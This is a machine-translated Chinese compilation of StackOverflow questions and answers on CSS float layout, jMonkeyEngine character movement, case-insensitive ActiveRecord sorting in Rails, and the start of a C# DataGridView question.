# StackOverflow 问答 11806000-11806999

# css - CSS 设计网页浮动错误（低分辨率与高分辨率）

> ID：11806000
> 
> 赞同：0
> 
> 时间：2012-08-04T04:53:39.903
> 
> 标签：css, css-float

我对 float css 有疑问。它在低分辨率下非常完美，但在高分辨率下就坏了。我有两列，左和右，它们分别是float：left和float：right。当我以低分辨率运行时，它是完美的显示。像这样：

![在此处输入图像描述](../Images/d844d8dcf2c8e6c5df05f46279988338.png)

但是当我以高分辨率运行它时，会变成这样：

![在此处输入图像描述](../Images/c70d97ad70d1834af3657268d1680d5b.png)

这是一些代码：index.php

```
<body>
    <div id="Content">
        <div id="top-left">
            <div class="floatLeft" style="padding-top:34px">
                <hr align="left" class="line1">
                <div id="language">
                    <?php
                        include("include/language.php");
                    ?>
                </div>
                <div class="clearBoth"></div>
            </div>
            <div class="imageIndex"><img src="images/coba.jpg"></div>
            <div class="clearBoth"></div>
        </div>

        <div id="top-right">
            <div id="csStatus" style="margin-left:-17px">
                <?php
                    include("include/status.php");
                ?>
            </div>
            <div style="height:75px">
                <?php
                    include("include/marketing.php");
                ?>
            </div>

            <div id="captionSlide">

            </div>
            <div class="floatLeft" style="padding-top:113px"><hr class="line2"></div>
        </div>
        <div class="clearBoth"></div>

        <div class="floatLeft" style="margin-left:87px;margin-top:-110px;">
            <img src="images/side.png">
        </div>
        <div id="contentTop">
            <div id="logo">
                <?php
                    include("include/logo.php");
                ?>
            </div>
            <div class="floatLeft" style="margin-left:54px"><img src="images/ctr.png"></div>
            <table id="search">
                <?php
                    include("include/search.php");
                ?>
            </table>
            <br>

            <div id="menuLeft">
                <?php
                    include("include/menu-left.php");
                ?>
            </div>
            <div id="menuRight">
                <?php
                    include("include/menu-right.php");
                ?>
            </div>
            <br><br><br><br>

            <div id="contentWeb">
                <div id="contentLeft" style="float:left;">
                    <table id="leftTable">
                        <tr>
                            <td style="width:195px">
                                <div id="stockist">
                                    PROJECT<br>
                                    <img src="images/stockist.jpg" class="imageBorder">
                                </div>
                            </td>
                            <td style="width:230px;vertical-align:top;">
                                <span id="agenda">
                                    AGENDA
                                </span><br><br>

                            </td>
                        </tr>
                    </table>
                </div>
                <div id="contentRight" style="float:right;">
                    <table id="rightTable">
                        <tr>
                            <td style="width:230px;vertical-align:top;">
                                <span id="latestProduct">
                                    LATEST PRODUCT
                                </span><br><br>
                                <table>

                                </table>
                            </td>
                        </tr>
                    </table>
                </div>  
            </div>
        </div>
        <div class="clearBoth"></div>
        <div id="Footer">
            <div id="contentFooter">
                PT. TANGGA MAS JAYA MAKMUR scaffolding | Published by. BixelLite &copy; 2012
            </div>
        </div>
    </div>
</body> 
```

这是一些CSS：

```
#Content {
margin:0px auto;}

.floatLeft{
float:left;}

#top-left{
float:left;}

#top-right{
float:right;}

#Footer{
background-color:#90bc21;
width:546px;
height:39px;
text-align:right;} 
```

任何建议如何解决它？

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T08:42:13.353

只需在您的内容上设置一个宽度，以使所有内容始终保持相同的宽度

感谢 Torr3nt

# java - 如何让我的角色正确行走？

> ID：11806002
> 
> 赞同：3
> 
> 时间：2012-08-04T04:54:04.580
> 
> 标签：java, graphics, 3d, ogre, jmonkeyengine

我正在制作一个小型 3D 场景，角色可以通过按 WASD 按钮行走，但正在播放的动画不正确，角色转身，所以看起来他在移动时正在月球漫步。 ![在此处输入图像描述](../Images/f1f1a4b59b0e3a2a87415d9c0b3c6b61.png)

按钮的控制代码是

```
private void setupKeys() {
    inputManager.addMapping("wireframe", new KeyTrigger(KeyInput.KEY_T));
    inputManager.addListener(this, "wireframe");
    inputManager.addMapping("CharLeft", new KeyTrigger(KeyInput.KEY_A));
    inputManager.addMapping("CharRight", new KeyTrigger(KeyInput.KEY_D));
    inputManager.addMapping("CharUp", new KeyTrigger(KeyInput.KEY_W));
    inputManager.addMapping("CharDown", new KeyTrigger(KeyInput.KEY_S));
    inputManager.addMapping("CharSpace",
            new KeyTrigger(KeyInput.KEY_RETURN));
    inputManager
            .addMapping("CharShoot", new KeyTrigger(KeyInput.KEY_SPACE));
    inputManager.addListener(this, "CharLeft");
    inputManager.addListener(this, "CharRight");
    inputManager.addListener(this, "CharUp");
    inputManager.addListener(this, "CharDown");
    inputManager.addListener(this, "CharSpace");
    inputManager.addListener(this, "CharShoot");
} 
```

更新循环看起来像这样

```
public void simpleUpdate(float tpf) {
    Vector3f camDir = cam.getDirection().clone().multLocal(0.1f);
    Vector3f camLeft = cam.getLeft().clone().multLocal(0.1f);
    camDir.y = 0;
    camLeft.y = 0;
    walkDirection.set(0, 0, 0);
    if (left) {
        walkDirection.addLocal(camLeft);
    }
    if (right) {
        walkDirection.addLocal(camLeft.negate());
    }
    if (up) {
        walkDirection.addLocal(camDir);
    }
    if (down) {
        walkDirection.addLocal(camDir.negate());
    }
    if (!character.onGround()) {
        airTime = airTime + tpf;
    } else {
        airTime = 0;
    }
    if (walkDirection.length() == 0) {
        if (!"Idle1".equals(animationChannel.getAnimationName())) {
            animationChannel.setAnim("Idle1", 1f);
        }
    } else {
        character.setViewDirection(walkDirection);
        if (airTime > .3f) {
            if (!"stand".equals(animationChannel.getAnimationName())) {
                animationChannel.setAnim("stand");
            }
        } else if (!"Walk".equals(animationChannel.getAnimationName())) {
            animationChannel.setAnim("Walk", 0.7f);
        }
    }
    character.setWalkDirection(walkDirection);
} 
```

我不明白出了什么问题，因为它实际上非常接近工作，我所需要的只是角色在行走时不会转身并播放正确的动画。你知道问题可能是什么吗？

整个程序是

```
package adventure;

import java.applet.Applet;
import com.jme3.math.Quaternion;
import com.jme3.math.FastMath;
import java.applet.AudioClip;
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Image;
import java.awt.TextArea;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import com.jme3.material.RenderState.FaceCullMode;
import javax.swing.JFrame;
import javax.swing.JPanel;
import com.jme3.renderer.queue.RenderQueue.ShadowMode;
import com.jme3.animation.AnimChannel;
import com.jme3.animation.AnimControl;
import com.jme3.animation.AnimEventListener;
import com.jme3.animation.LoopMode;
import com.jme3.app.SimpleApplication;
import com.jme3.asset.BlenderKey;
import com.jme3.asset.TextureKey;
import com.jme3.asset.plugins.ZipLocator;
import com.jme3.bullet.BulletAppState;
import com.jme3.bullet.PhysicsSpace;
import com.jme3.bullet.collision.PhysicsCollisionEvent;
import com.jme3.bullet.collision.PhysicsCollisionListener;
import com.jme3.bullet.collision.shapes.CapsuleCollisionShape;
import com.jme3.bullet.collision.shapes.CollisionShape;
import com.jme3.bullet.collision.shapes.SphereCollisionShape;
import com.jme3.bullet.control.CharacterControl;
import com.jme3.bullet.control.RigidBodyControl;
import com.jme3.bullet.util.CollisionShapeFactory;
import com.jme3.effect.ParticleEmitter;
import com.jme3.effect.ParticleMesh.Type;
import com.jme3.effect.shapes.EmitterSphereShape;
import com.jme3.input.ChaseCamera;
import com.jme3.input.KeyInput;
import com.jme3.input.controls.ActionListener;
import com.jme3.input.controls.KeyTrigger;
import com.jme3.light.DirectionalLight;
import com.jme3.material.Material;
import com.jme3.math.ColorRGBA;
import com.jme3.math.Vector2f;
import com.jme3.math.Vector3f;
import com.jme3.post.FilterPostProcessor;
import com.jme3.post.filters.BloomFilter;
import com.jme3.renderer.Camera;
import com.jme3.renderer.queue.RenderQueue.ShadowMode;
import com.jme3.scene.Geometry;
import com.jme3.scene.Node;
import com.jme3.scene.Spatial;
import com.jme3.scene.shape.Box;
import com.jme3.scene.shape.Sphere;
import com.jme3.scene.shape.Sphere.TextureMode;
import com.jme3.system.AppSettings;
import com.jme3.system.JmeCanvasContext;
import com.jme3.terrain.geomipmap.TerrainLodControl;
import com.jme3.terrain.geomipmap.TerrainQuad;
import com.jme3.terrain.heightmap.AbstractHeightMap;
import com.jme3.terrain.heightmap.ImageBasedHeightMap;
import com.jme3.texture.Texture;
import com.jme3.texture.Texture.WrapMode;
import com.jme3.util.SkyFactory;

public class MountainWorld extends SimpleApplication implements ActionListener,
        PhysicsCollisionListener, AnimEventListener, Playable {

      /** Prepare Materials */
      Material wall_mat;
      Material stone_mat;
      Material floor_mat;

      /** Prepare geometries and physical nodes for bricks and cannon balls. */
      private RigidBodyControl    brick_phy;
      private static final Box    box;
      private RigidBodyControl    ball_phy;
      private static final Sphere sphere;
      private RigidBodyControl    floor_phy;
      private static final Box    floor;

      /** dimensions used for bricks and wall */
      private static final float brickLength = 0.48f;
      private static final float brickWidth  = 0.24f;
      private static final float brickHeight = 0.12f;

      static {
        /** Initialize the cannon ball geometry */
        sphere = new Sphere(32, 32, 0.4f, true, false);
        sphere.setTextureMode(TextureMode.Projected);
        /** Initialize the brick geometry */
        box = new Box(Vector3f.ZERO, brickLength, brickHeight, brickWidth);
        box.scaleTextureCoordinates(new Vector2f(1f, .5f));
        /** Initialize the floor geometry */
        floor = new Box(Vector3f.ZERO, 100f, 0.1f, 50f);
        floor.scaleTextureCoordinates(new Vector2f(3, 6));
      }

    private static World world;
    private static Person person;
    private static Player dplayer;
    private static TextArea textarea;
    private BulletAppState bulletAppState;
    private AnimChannel channel;
    private AnimControl control;
    // character
    CharacterControl character;
    Node model;
    // temp vectors
    Vector3f walkDirection = new Vector3f();
    // terrain
    TerrainQuad terrain;
    RigidBodyControl terrainPhysicsNode;
    // Materials
    Material matRock;
    Material matBullet;
    // animation
    AnimChannel animationChannel;
    AnimChannel shootingChannel;
    AnimControl animationControl;
    float airTime = 0;
    // camera
    boolean left = false, right = false, up = false, down = false;
    ChaseCamera chaseCam;
    // bullet
    Sphere bullet;
    SphereCollisionShape bulletCollisionShape;
    // explosion
    ParticleEmitter effect;
    // brick wall
    Box brick;
    float bLength = 0.8f;
    float bWidth = 0.4f;
    float bHeight = 0.4f;
    FilterPostProcessor fpp;
    private Spatial sceneModel;

    private RigidBodyControl landscape;
    public static void main(String[] args) {
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                AppSettings settings = new AppSettings(true);
                settings.setWidth(850);
                settings.setHeight(440);

                MountainWorld canvasApplication = new MountainWorld();
                canvasApplication.setSettings(settings);
                canvasApplication.createCanvas(); // create canvas!
                JmeCanvasContext ctx = (JmeCanvasContext) canvasApplication
                        .getContext();
                ctx.setSystemListener(canvasApplication);
                Dimension dim = new Dimension(640, 480);
                ctx.getCanvas().setPreferredSize(dim);

                JFrame window = new JFrame("Mountain World");
                window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

                JPanel panel = new JPanel(new BorderLayout()); // a panel
                world = new DungeonWorld(canvasApplication);
                person = new Person(world, "You", null);
                dplayer = new Player(world, person);
                Commands commands = new Commands(person);
                textarea = new TextArea("", 10, 60,
                        TextArea.SCROLLBARS_VERTICAL_ONLY);
                textarea.append("You are in a mountain. The trolls live here.\n");
                textarea.setEditable(false);
                panel.add("West", ctx.getCanvas());
                panel.add("East", commands);
                panel.add("South", textarea);
                window.add(panel);
                window.pack();
                window.setVisible(true);
                canvasApplication.startCanvas();

            }
        });
    }

    @Override
    public void simpleInitApp() {
        bulletAppState = new BulletAppState();
        bulletAppState.setThreadingType(BulletAppState.ThreadingType.PARALLEL);
        stateManager.attach(bulletAppState);
        setupKeys();
        //prepareBullet();
        //prepareEffect();
        createLight();
        //createSky();
        initMaterials();
        initFloor();
        //createTerrain();
        //createWall();
        createCharacters();
        setupChaseCamera();
        setupAnimationController();
        setupFilter();
    }
     /** Make a solid floor and add it to the scene. */
      public void initFloor() {
        Geometry floor_geo = new Geometry("Floor", floor);
        floor_geo.setMaterial(floor_mat);
        floor_geo.setLocalTranslation(0, -0.1f, 0);
        this.rootNode.attachChild(floor_geo);
        /* Make the floor physical with mass 0.0f! */
        floor_phy = new RigidBodyControl(0.0f);
        floor_geo.addControl(floor_phy);
        bulletAppState.getPhysicsSpace().add(floor_phy);
      }

      /** Initialize the materials used in this scene. */
      public void initMaterials() {
        wall_mat = new Material(assetManager, "Common/MatDefs/Misc/Unshaded.j3md");
        TextureKey key = new TextureKey("Textures/Terrain/BrickWall/BrickWall.jpg");
        key.setGenerateMips(true);
        Texture tex = assetManager.loadTexture(key);
        wall_mat.setTexture("ColorMap", tex);

        stone_mat = new Material(assetManager, "Common/MatDefs/Misc/Unshaded.j3md");
        TextureKey key2 = new TextureKey("Textures/Terrain/Rock/Rock.PNG");
        key2.setGenerateMips(true);
        Texture tex2 = assetManager.loadTexture(key2);
        stone_mat.setTexture("ColorMap", tex2);

        floor_mat = new Material(assetManager, "Common/MatDefs/Misc/Unshaded.j3md");
        TextureKey key3 = new TextureKey("Textures/Terrain/Pond/Pond.jpg");
        key3.setGenerateMips(true);
        Texture tex3 = assetManager.loadTexture(key3);
        tex3.setWrap(WrapMode.Repeat);
        floor_mat.setTexture("ColorMap", tex3);
      }

    private void setupFilter() {
        FilterPostProcessor fpp = new FilterPostProcessor(assetManager);
        BloomFilter bloom = new BloomFilter(BloomFilter.GlowMode.Objects);
        fpp.addFilter(bloom);
        viewPort.addProcessor(fpp);
    }

    private PhysicsSpace getPhysicsSpace() {
        return bulletAppState.getPhysicsSpace();
    }

    private void setupKeys() {
        inputManager.addMapping("wireframe", new KeyTrigger(KeyInput.KEY_T));
        inputManager.addListener(this, "wireframe");
        inputManager.addMapping("CharLeft", new KeyTrigger(KeyInput.KEY_A));
        inputManager.addMapping("CharRight", new KeyTrigger(KeyInput.KEY_D));
        inputManager.addMapping("CharUp", new KeyTrigger(KeyInput.KEY_W));
        inputManager.addMapping("CharDown", new KeyTrigger(KeyInput.KEY_S));
        inputManager.addMapping("CharSpace",
                new KeyTrigger(KeyInput.KEY_RETURN));
        inputManager
                .addMapping("CharShoot", new KeyTrigger(KeyInput.KEY_SPACE));
        inputManager.addListener(this, "CharLeft");
        inputManager.addListener(this, "CharRight");
        inputManager.addListener(this, "CharUp");
        inputManager.addListener(this, "CharDown");
        inputManager.addListener(this, "CharSpace");
        inputManager.addListener(this, "CharShoot");
    }

    private void createWall() {
        float xOff = -144;
        float zOff = -40;
        float startpt = bLength / 4 - xOff;
        float height = 6.1f;
        brick = new Box(Vector3f.ZERO, bLength, bHeight, bWidth);
        brick.scaleTextureCoordinates(new Vector2f(1f, .5f));
        for (int j = 0; j < 15; j++) {
            for (int i = 0; i < 4; i++) {
                Vector3f vt = new Vector3f(i * bLength * 2 + startpt, bHeight
                        + height, zOff);
                addBrick(vt);
            }
            startpt = -startpt;
            height += 1.01f * bHeight;
        }
    }

    private void addBrick(Vector3f ori) {
        Geometry reBoxg = new Geometry("brick", brick);
        reBoxg.setMaterial(matBullet);
        reBoxg.setLocalTranslation(ori);
        reBoxg.addControl(new RigidBodyControl(1.5f));
        reBoxg.setShadowMode(ShadowMode.CastAndReceive);
        this.rootNode.attachChild(reBoxg);
        this.getPhysicsSpace().add(reBoxg);
    }

    private void prepareBullet() {
        bullet = new Sphere(32, 32, 0.4f, true, false);
        bullet.setTextureMode(TextureMode.Projected);
        bulletCollisionShape = new SphereCollisionShape(0.4f);
        matBullet = new Material(getAssetManager(),
                "Common/MatDefs/Misc/Unshaded.j3md");
        matBullet.setColor("Color", ColorRGBA.Green);
        // matBullet.setColor("m_GlowColor", ColorRGBA.Green);
        getPhysicsSpace().addCollisionListener(this);
    }

    private void prepareEffect() {
        int COUNT_FACTOR = 1;
        float COUNT_FACTOR_F = 1f;
        effect = new ParticleEmitter("Flame", Type.Triangle, 32 * COUNT_FACTOR);
        effect.setSelectRandomImage(true);
        effect.setStartColor(new ColorRGBA(1f, 0.4f, 0.05f,
                (float) (1f / COUNT_FACTOR_F)));
        effect.setEndColor(new ColorRGBA(.4f, .22f, .12f, 0f));
        effect.setStartSize(1.3f);
        effect.setEndSize(2f);
        effect.setShape(new EmitterSphereShape(Vector3f.ZERO, 1f));
        effect.setParticlesPerSec(0);
        effect.setGravity(0, -5, 0);
        effect.setLowLife(.4f);
        effect.setHighLife(.5f);
        effect.setInitialVelocity(new Vector3f(0, 7, 0));
        effect.setVelocityVariation(1f);
        effect.setImagesX(2);
        effect.setImagesY(2);
        Material mat = new Material(assetManager,
                "Common/MatDefs/Misc/Particle.j3md");
        mat.setTexture("Texture",
                assetManager.loadTexture("Effects/Explosion/flame.png"));
        effect.setMaterial(mat);
        // effect.setLocalScale(100);
        rootNode.attachChild(effect);
    }

    private void createLight() {
        Vector3f direction = new Vector3f(-0.1f, -0.7f, -1).normalizeLocal();
        DirectionalLight dl = new DirectionalLight();
        dl.setDirection(direction);
        dl.setColor(new ColorRGBA(1f, 1f, 1f, 1.0f));
        rootNode.addLight(dl);
    }

    private void createSky() {
        rootNode.attachChild(SkyFactory.createSky(assetManager,
                "Textures/Sky/Bright/BrightSky.dds", false));
    }

    private void createTerrain2() {
        matRock = new Material(assetManager,
                "Common/MatDefs/Terrain/TerrainLighting.j3md");
        matRock.setBoolean("useTriPlanarMapping", false);
        matRock.setBoolean("WardIso", true);
        matRock.setTexture("AlphaMap",
                assetManager.loadTexture("Textures/Terrain/splat/alphamap.png"));
        Texture heightMapImage = assetManager
                .loadTexture("Textures/Terrain/splat/mountains512.png");
        Texture grass = assetManager
                .loadTexture("Textures/Terrain/splat/grass.jpg");
        grass.setWrap(WrapMode.Repeat);
        matRock.setTexture("DiffuseMap", grass);
        matRock.setFloat("DiffuseMap_0_scale", 64);
        Texture dirt = assetManager
                .loadTexture("Textures/Terrain/splat/dirt.jpg");
        dirt.setWrap(WrapMode.Repeat);
        matRock.setTexture("DiffuseMap_1", dirt);
        matRock.setFloat("DiffuseMap_1_scale", 16);
        Texture rock = assetManager
                .loadTexture("Textures/Terrain/splat/road.jpg");
        rock.setWrap(WrapMode.Repeat);
        matRock.setTexture("DiffuseMap_2", rock);
        matRock.setFloat("DiffuseMap_2_scale", 128);
        Texture normalMap0 = assetManager
                .loadTexture("Textures/Terrain/splat/grass_normal.jpg");
        normalMap0.setWrap(WrapMode.Repeat);
        Texture normalMap1 = assetManager
                .loadTexture("Textures/Terrain/splat/dirt_normal.png");
        normalMap1.setWrap(WrapMode.Repeat);
        Texture normalMap2 = assetManager
                .loadTexture("Textures/Terrain/splat/road_normal.png");
        normalMap2.setWrap(WrapMode.Repeat);
        matRock.setTexture("NormalMap", normalMap0);
        matRock.setTexture("NormalMap_1", normalMap2);
        matRock.setTexture("NormalMap_2", normalMap2);

        AbstractHeightMap heightmap = null;
        try {
            heightmap = new ImageBasedHeightMap(heightMapImage.getImage(),
                    0.25f);
            heightmap.load();

        } catch (Exception e) {
            e.printStackTrace();
        }

        terrain = new TerrainQuad("terrain", 65, 513, heightmap.getHeightMap());
        List<Camera> cameras = new ArrayList<Camera>();
        cameras.add(getCamera());
        TerrainLodControl control = new TerrainLodControl(terrain, cameras);
        terrain.addControl(control);
        terrain.setMaterial(matRock);
        terrain.setLocalScale(new Vector3f(2, 2, 2));

        terrainPhysicsNode = new RigidBodyControl(
                CollisionShapeFactory.createMeshShape(terrain), 0);
        terrain.addControl(terrainPhysicsNode);
        rootNode.attachChild(terrain);
        getPhysicsSpace().add(terrainPhysicsNode);
    }

    private void createTerrain() {

         assetManager.registerLocator("town.zip", ZipLocator.class);
         sceneModel = assetManager.loadModel("main.scene");
        //sceneModel = assetManager.loadModel("Scenes/ManyLights/Main.scene");
        sceneModel.setLocalScale(2f);
        //initFloor();
        // We set up collision detection for the scene by creating a
        // compound collision shape and a static RigidBodyControl with mass
        // zero.
        CollisionShape sceneShape = CollisionShapeFactory
                .createMeshShape((Node) sceneModel);
        landscape = new RigidBodyControl(sceneShape, 0);
        sceneModel.addControl(landscape);
        List<Camera> cameras = new ArrayList<Camera>();
        cameras.add(getCamera());
        rootNode.attachChild(sceneModel);
    }

    private void createCharacters() {
        CapsuleCollisionShape capsule = new CapsuleCollisionShape(0.0f, 0.0f);
        character = new CharacterControl(capsule, 0.01f);
        model = (Node) assetManager.loadModel("Models/Ninja/Ninja.mesh.xml");
        float scale = 0.25f;
        model.scale(0.05f, 0.05f, 0.05f);
        model.addControl(character);
        character.setPhysicsLocation(new Vector3f(0, 0f, 0));
        model.setShadowMode(ShadowMode.CastAndReceive);
        character.setViewDirection(new Vector3f(1, 0, 0));
        rootNode.attachChild(model);
        getPhysicsSpace().add(character);

        //BlenderKey blenderKey = new BlenderKey("Models/Oto/Oto.mesh.xml");

        //Spatial man = (Spatial) assetManager.loadModel(blenderKey);
        //man.setLocalTranslation(new Vector3f(-140, 12.5f, -10));

        // man.setShadowMode(ShadowMode.CastAndReceive);
        //rootNode.attachChild(man);

    }

    private void setupChaseCamera() {
        flyCam.setEnabled(false);
        chaseCam = new ChaseCamera(cam, model, inputManager);
    }

    private void setupAnimationController() {
        animationControl = model.getControl(AnimControl.class);
        animationControl.addListener(this);
        animationChannel = animationControl.createChannel();
        // shootingChannel = animationControl.createChannel();
        // shootingChannel.addBone(animationControl.getSkeleton().getBone(
        // "uparm.right"));
        // shootingChannel.addBone(animationControl.getSkeleton().getBone(
        // "arm.right"));
        // shootingChannel.addBone(animationControl.getSkeleton().getBone(
        // "hand.right"));
    }

    @Override
    public void simpleUpdate(float tpf) {
        Vector3f camDir = cam.getDirection().clone().multLocal(0.1f);
        Vector3f camLeft = cam.getLeft().clone().multLocal(0.1f);
        camDir.y = 0;
        camLeft.y = 0;
        walkDirection.set(0, 0, 0);
        if (left) {
            walkDirection.addLocal(camLeft);
        }
        if (right) {
            walkDirection.addLocal(camLeft.negate());
        }
        if (up) {
            walkDirection.addLocal(camDir);
        }
        if (down) {
            walkDirection.addLocal(camDir.negate());
        }
        if (!character.onGround()) {
            airTime = airTime + tpf;
        } else {
            airTime = 0;
        }
        if (walkDirection.length() == 0) {
            if (!"Idle1".equals(animationChannel.getAnimationName())) {
                animationChannel.setAnim("Idle1", 1f);
            }
        } else {
            character.setViewDirection(walkDirection);
            if (airTime > .3f) {
                if (!"stand".equals(animationChannel.getAnimationName())) {
                    animationChannel.setAnim("stand");
                }
            } else if (!"Walk".equals(animationChannel.getAnimationName())) {
                animationChannel.setAnim("Walk", 0.7f);
            }
        }
        character.setWalkDirection(walkDirection);
    }

    public void onAction(String binding, boolean value, float tpf) {
        if (binding.equals("CharLeft")) {
            if (value) {
                left = true;
            } else {
                left = false;
            }
        } else if (binding.equals("CharRight")) {
            if (value) {
                right = true;
            } else {
                right = false;
            }
        } else if (binding.equals("CharUp")) {
            if (value) {
                up = true;
            } else {
                up = false;
            }
        } else if (binding.equals("CharDown")) {
            if (value) {
                down = true;
            } else {
                down = false;
            }
        } else if (binding.equals("CharSpace")) {
            character.jump();
        } else if (binding.equals("CharShoot") && !value) {
            bulletControl();
        }
    }

    private void bulletControl() {
        shootingChannel.setAnim("Dodge", 0.1f);
        shootingChannel.setLoopMode(LoopMode.DontLoop);
        Geometry bulletg = new Geometry("bullet", bullet);
        bulletg.setMaterial(matBullet);
        bulletg.setShadowMode(ShadowMode.CastAndReceive);
        bulletg.setLocalTranslation(character.getPhysicsLocation().add(
                cam.getDirection().mult(5)));
        RigidBodyControl bulletControl = new BombControl(bulletCollisionShape,
                1);
        bulletControl.setCcdMotionThreshold(0.1f);
        bulletControl.setLinearVelocity(cam.getDirection().mult(80));
        bulletg.addControl(bulletControl);
        rootNode.attachChild(bulletg);
        getPhysicsSpace().add(bulletControl);
    }

    public void collision(PhysicsCollisionEvent event) {
        if (event.getObjectA() instanceof BombControl) {
            final Spatial node = event.getNodeA();
            effect.killAllParticles();
            effect.setLocalTranslation(node.getLocalTranslation());
            effect.emitAllParticles();
        } else if (event.getObjectB() instanceof BombControl) {
            final Spatial node = event.getNodeB();
            effect.killAllParticles();
            effect.setLocalTranslation(node.getLocalTranslation());
            effect.emitAllParticles();
        }
    }

    public void onAnimCycleDone(AnimControl control, AnimChannel channel,
            String animName) {
        if (channel == shootingChannel) {
            channel.setAnim("stand");
        }
    }

    public void onAnimChange(AnimControl control, AnimChannel channel,
            String animName) {
    }

    // Load an image from the net, making sure it has already been
    // loaded when the method returns
    public Image loadPicture(String imageName) {
        return null;
    }

    // Load and play a sound from /usr/local/hacks/sounds/

    public void playSound(String name) {
        URL u = null;

        try {
            u = new URL("file:" + "/usr/local/hacks/sounds/" + name + ".au");
        } catch (MalformedURLException e) {
        }

        AudioClip a = Applet.newAudioClip(u);
        a.play();
    }
} 
```

## 更新

我更改了一行代码以包含我在开始时必须做的转换： `character.setViewDirection(walkDirection.add(new Vector3f(1, 0, 0)));` 即我添加了`Vector3f(1, 0, 0)`and 这似乎有帮助，现在我的角色可以看似完美地向前和向后移动。 ![在此处输入图像描述](../Images/b80b311d2a758476aa3eb2ceca15e886.png) 但是，尽管“月球漫步”消失了，但横向移动时仍然不完美，也许您可​​以确认我使用向量的 add 方法做了正确的事情？

## 更新 2

当改变矢量来否定忍者开始像他应该的那样移动！ `character.setViewDirection(walkDirection.negate());`

例如在更新代码中

```
public void simpleUpdate(float tpf) {
    Vector3f camDir = cam.getDirection().clone().multLocal(0.1f);
    Vector3f camLeft = cam.getLeft().clone().multLocal(0.1f);
    camDir.y = 0;
    camLeft.y = 0;
    walkDirection.set(0, 0, 0);
    if (left) {
        walkDirection.addLocal(camLeft);
    }
    if (right) {
        walkDirection.addLocal(camLeft.negate());
    }
    if (up) {
        walkDirection.addLocal(camDir);
    }
    if (down) {
        walkDirection.addLocal(camDir.negate());
    }
    if (!character.onGround()) {
        airTime = airTime + tpf;
    } else {
        airTime = 0;
    }
    if (walkDirection.length() == 0) {
        if (!"Idle1".equals(animationChannel.getAnimationName())) {
            animationChannel.setAnim("Idle1", 1f);
        }
    } else {            
        System.out.println("setting walk direction " + walkDirection);
        character.setViewDirection(walkDirection.negate());

        if (airTime > .3f) {
            if (!"stand".equals(animationChannel.getAnimationName())) {
                animationChannel.setAnim("stand");
            }
        } else if (!"Walk".equals(animationChannel.getAnimationName())) {
            System.out.println("in walk Walk ");
            animationChannel.setAnim("Walk", 0.7f);
        }
    }
    character.setWalkDirection(walkDirection);
} 
```

![在此处输入图像描述](../Images/e2c809a052ed0377da7560b639593dc4.png)

现在剩下的问题是让 char 跳跃并越过楼梯。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T07:27:13.343

我不是动画专家，但如果你在播放步行动画时向前移动，它应该看起来没问题。为了获得更好的效果，您可能需要在反动画（例如站立、行走、转弯）之间进行一些过渡，这些过渡可以是单独的动画，也可以通过使用动画混合来实现。

然而，很难理解你的问题到底是什么，因为描述很短，而且我们不能从一堆代码中看出动画问题。

除此之外，如果您的问题是如何正确配置 JMonkeyEngine，您可能会在他们的论坛上做得更好。或在[https://gamedev.stackexchange.com/](https://gamedev.stackexchange.com/)。

# sql - Rails：ActiveRecord db 排序操作不区分大小写

> ID：11806004
> 
> 赞同：15
> 
> 时间：2012-08-04T04:54:11.533
> 
> 标签：sql, ruby-on-rails, activerecord

我正在尝试学习 Rails [通过遵循 coursera 中的 SAAS 课程] 并使用 ActiveRecord 处理简单的电影表。

我想显示所有按标题排序的电影。我希望它不区分大小写。

我试过这样做：

```
Movie.all(:conditions => ["lower(title) = ?", title.downcase],:order => "title DESC")
=>undefined local variable or method `title' for #<MoviesController:0xb4da9a8> 
```

我认为它不识别 lower(title) 。

这是实现不区分大小写排序的最佳方法吗？

谢谢！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-08-04T04:57:52.633

使用`where`与不使用`all`

```
Movie.where("lower(title) = ?", title.downcase).order("title DESC") 
```

虽然不是很了解这种类型。在这里，您将获得所有标题较低的电影等于`title.downcase`. 一切都是平等的，你怎么能排序呢`title desc`？

要按小写标题按字母顺序对所有电影进行反向排序：

```
Movie.order("lower(title) DESC").all 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-04T05:01:19.670

你必须这样做：

```
Movie.order("lower(title) DESC").all 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2017-10-20T00:58:31.200

更健壮的解决方案是使用 arel 节点。我建议在`Movie`模型上定义几个范围：

```
scope :order_by_title, -> {
  order(arel_table['title'].lower.desc)
}

scope :for_title, (title)-> {
  where(arel_table['title'].lower.eq title.downcase)
} 
```

然后打电话`Movie.for_title(title).order_by_title`

与列出的其他答案相比，优势在于，如果您为列加上别名或使用列连接到另一个表，并且它们是 sql 转义的`.for_title`，`.order_by_title`则不会中断。`title``title`

就像 rickypai[提到](https://stackoverflow.com/a/11806024/8031815)的那样，如果您在列上没有索引，数据库会很慢。但是，复制数据并将转换应用到另一列是不好的（正常）形式，因为这样一列可能会与另一列不同步。不幸的是，早期版本的 mysql除了触发器之外不允许有许多[替代方案。](https://stackoverflow.com/a/35380963/8031815)在 5.7.5 之后，您可以使用虚拟[生成的列](http://mysqlserverteam.com/generated-columns-in-mysql-5-7-5/)来执行此操作。然后在不区分大小写的情况下，您只需使用生成的列（这实际上使 ruby​​ 更直接）。

Postgres 在这方面有更多的灵活性，并且可以让您在函数上创建索引而不必引用特殊列，或者您可以使列成为不区分大小写的列。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-04T04:58:00.370

让 MySQL 每次都执行大写或小写操作非常昂贵。

我推荐的是有一个`title`专栏和一个`title_lower`专栏。这样，您可以轻松地在列上不区分大小写地显示和排序，`title_lower`而无需在每次排序时让 MySQL 执行上限或下限。

记住要同时索引或至少索引`title_lower`.

# c# - 以编程方式创建 X 列 X 行的 DataGridView 的最简单方法

> ID：11806007
> 
> 赞同：2
> 
> 时间：2012-08-04T04:54:44.363
> 
> 标签：c#, winforms, datagridview

在 C# Winforms 中，我想使用 DataGridView 作为一个简单的小部件来存储要显示给用户的信息。为此，我想创建一个 5x10 单元格的表格。

